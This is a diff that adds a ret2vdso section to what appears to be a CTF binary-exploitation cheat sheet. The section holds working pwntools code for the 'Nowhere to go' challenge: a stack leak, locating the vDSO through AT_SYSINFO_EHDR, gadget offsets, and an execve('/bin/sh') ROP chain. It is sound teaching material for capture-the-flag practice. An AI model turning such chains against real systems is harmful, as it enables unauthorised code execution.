@@ -14,6 +14,7 @@
 - [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
 - [.fini_array Hijack](#fini_array-hijack)
 - [Pwntools Template](#pwntools-template)
+- [ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)](#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go)
 - [Useful Commands](#useful-commands)
 
 ---
@@ -475,6 +476,72 @@ def find_offset(exe):
 ```
 
 **Key insight:** Pwntools auto-generates a core file from the crashed process. Reading the saved return address from `corefile.sp` (x64) or `corefile.pc` (x86) and passing it to `cyclic_find()` gives the exact offset. Eliminates manual GDB inspection.
+
+## ret2vdso — Using Kernel vDSO Gadgets (HTB Nowhere to go)
+
+**Pattern:** Statically-linked binary with minimal functions and zero useful ROP gadgets (no `pop rdi`, `pop rsi`, `pop rax`, etc.). The Linux kernel maps a vDSO (Virtual Dynamic Shared Object) into every process, and it contains enough gadgets for `execve`.
+
+### Step 1 — Stack leak
+
+Overflow a buffer and read back more bytes than sent to leak stack pointers:
+```python
+p.send(b'A' * 0x20)
+resp = p.recv(0x80)
+leak = u64(resp[0x30:0x38])
+stackbase = (leak & 0x0000FFFFFFFFF000) - 0x20000
+```
+
+### Step 2 — Write `/bin/sh` to known address
+
+Use the binary's own `read` function via ROP to place `/bin/sh\0` at a page-aligned stack address:
+```python
+payload = b'B' * 32 + p64(READ_FUNC) + p64(LOOP) + p64(0x8) + p64(stackbase)
+p.sendline(payload)
+p.send(b'/bin/sh\x00')
+```
+
+### Step 3 — Find vDSO base via AT_SYSINFO_EHDR
+
+Dump the stack using the binary's `write` function. Search for `AT_SYSINFO_EHDR` (auxv type `0x21`) which holds the vDSO base address:
+```python
+# Dump 0x21000 bytes from stackbase
+for i in range(0, len(stackdump) - 15, 8):
+    val = u64(stackdump[i:i+8])
+    if val == 0x21:  # AT_SYSINFO_EHDR
+        next_val = u64(stackdump[i+8:i+16])
+        if 0x7f0000000000 <= next_val <= 0x7fffffffffff and (next_val & 0xFFF) == 0:
+            vdso_base = next_val
+            break
+```
+
+### Step 4 — Dump vDSO and find gadgets
+
+Dump 0x2000 bytes from `vdso_base` using the binary's `write` function, then search for gadgets. Common vDSO gadgets:
+```python
+POP_RDX_RAX_RET     = vdso_base + 0xba0  # pop rdx; pop rax; ret
+POP_RBX_R12_RBP_RET = vdso_base + 0x8c6  # pop rbx; pop r12; pop rbp; ret
+MOV_RDI_RBX_SYSCALL = vdso_base + 0x8e3  # mov rdi, rbx; mov rsi, r12; syscall
+```
+
+### Step 5 — execve ROP chain
+
+```python
+payload = b'A' * 32
+payload += p64(POP_RDX_RAX_RET)
+payload += p64(0x0)              # rdx = NULL (envp)
+payload += p64(59)               # rax = execve
+payload += p64(POP_RBX_R12_RBP_RET)
+payload += p64(stackbase)        # rbx → rdi = &"/bin/sh"
+payload += p64(0x0)              # r12 → rsi = NULL (argv)
+payload += p64(0xdeadbeef)       # rbp (dummy)
+payload += p64(MOV_RDI_RBX_SYSCALL)
+```
+
+**Key insight:** The vDSO is kernel-specific — different kernels have different gadget offsets. Always dump the remote vDSO rather than assuming local offsets. The auxv `AT_SYSINFO_EHDR` (type 0x21) on the stack is the reliable way to find the vDSO base address.
+
+**Detection:** Statically-linked binary with few functions, no libc, and no useful gadgets. QEMU-hosted challenges often run custom kernels with unique vDSO layouts.
+
+---
 
 ## Useful Commands
 
